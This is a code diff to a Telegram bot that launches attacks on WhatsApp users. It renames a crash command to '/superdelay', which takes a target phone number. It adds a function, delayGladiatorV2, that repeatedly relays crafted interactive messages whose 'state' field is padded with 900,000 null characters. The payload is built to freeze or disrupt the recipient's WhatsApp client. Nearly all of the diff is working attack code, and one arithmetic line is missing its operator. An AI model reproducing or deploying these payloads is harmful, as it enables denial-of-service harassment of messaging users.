@@ -2048,9 +2048,9 @@ bot.command("lowdelay", checkWhatsAppConnection, checkCooldown, async (ctx) => {
   });
 });
 
-bot.command("crashblank", checkWhatsAppConnection, checkCooldown, async (ctx) => {
+bot.command("superdelay", checkWhatsAppConnection, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /crashblank  62×××`);
+  if (!q) return ctx.reply(`🪧 ☇ Format: /superdelay  62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   let mention = true;
 
@@ -2058,7 +2058,7 @@ bot.command("crashblank", checkWhatsAppConnection, checkCooldown, async (ctx) =>
     caption: `
 <pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
 ⌑ Target: ${q}
-⌑ Type: Crash Blank
+⌑ Type: Delay No Log Out
 ⌑ Status: Process
 ╘═——————————————═⬡</code></pre>`,
     parse_mode: "HTML",
@@ -2071,15 +2071,15 @@ bot.command("crashblank", checkWhatsAppConnection, checkCooldown, async (ctx) =>
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 60; i++) {
-    await Ramadhan(sock, target);
+  for (let i = 0; i < 10; i++) {
+    await delayGladiatorV2(sock, target);
     await sleep(1000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
 <pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
 ⌑ Target: ${q}
-⌑ Type: Crash Blank
+⌑ Type: Delay No Log Out
 ⌑ Status: Success
 ╘═——————————————═⬡</code></pre>`, {
     parse_mode: "HTML",
@@ -3371,6 +3371,55 @@ const msg1 = {
     },
     {}
   );
+}
+
+async function delayGladiatorV2(sock, target) {
+  function handler(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  for (let i = 0; i < 15; i++) {
+    const delay = i  250;
+    await handler(delay);
+
+    const zephyMessages = generateWAMessageFromContent(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: {
+            interactiveResponseMessage: {
+              body: {
+                text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}",
+                format: "DEFAULT"
+              },
+              nativeFlowResponseMessage: {
+                name: "addressmessage",
+                paramsJson: {
+                  "values": {
+                    "inpincode": "0",
+                    "buildingname": "",
+                    "landmarkarea": "",
+                    "address": "",
+                    "towernumber": "",
+                    "city": "",
+                    "name": "zephyrine",
+                    "phonenumber": "1002001500",
+                    "housenumber": "",
+                    "floornumber": "",
+                    "state": "\u0000".repeat(900000)
+                  }
+                },
+                version: 3
+              }
+            }
+          }
+        }
+      },
+      { userJid: target }
+    );
+
+    await sock.relayMessage(target, zephyMessages.message, {});
+  }
 }
 //
 
